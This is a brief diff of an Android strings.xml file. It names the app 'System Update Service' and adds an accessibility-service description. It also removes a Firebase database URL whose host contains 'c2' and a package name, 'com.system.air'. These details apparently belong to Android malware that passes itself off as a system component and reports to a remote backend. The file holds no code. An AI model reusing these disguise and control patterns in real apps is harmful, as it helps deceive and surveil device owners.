@@ -1,5 +1,5 @@
+<?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="app_name">System Update Service</string>
-    <string name="firebase_database_url">https://vypervic-c2-default-rtdb.firebaseio.com/</string>
-    <string name="package_name">com.system.air</string>
+    <string name="accessibility_service_description">System accessibility service</string>
 </resources>
